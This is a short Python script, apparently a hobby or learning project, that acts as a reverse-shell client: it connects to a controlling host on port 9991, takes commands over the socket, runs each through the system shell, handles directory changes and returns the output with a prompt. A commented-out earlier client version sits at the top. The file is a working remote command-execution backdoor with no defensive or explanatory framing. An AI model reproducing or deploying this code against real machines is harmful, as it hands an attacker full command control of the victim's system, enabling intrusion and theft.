import os
import socket
import subprocess

# def Main():
#     host = '127.0.0.1'
#     port = 5100

#     s = socket.socket()
#     s.connect((host, port))
#     message = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE)
#     while message != "q":
#         s.send(message)
#         data = s.recv(1024)
#         print("Received from server: " + str(data))
#         message = raw_input("->")
#     s.close()

# if __name__ == '__main__':
#     Main()

s= socket.socket()
host = '127.0.0.1' 
# 192.168.0.5'
port = 9991

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes)
        s.send(str.encode(output_str + str(os.getcwd()) + "> " ))
        print(output_str)

s.close()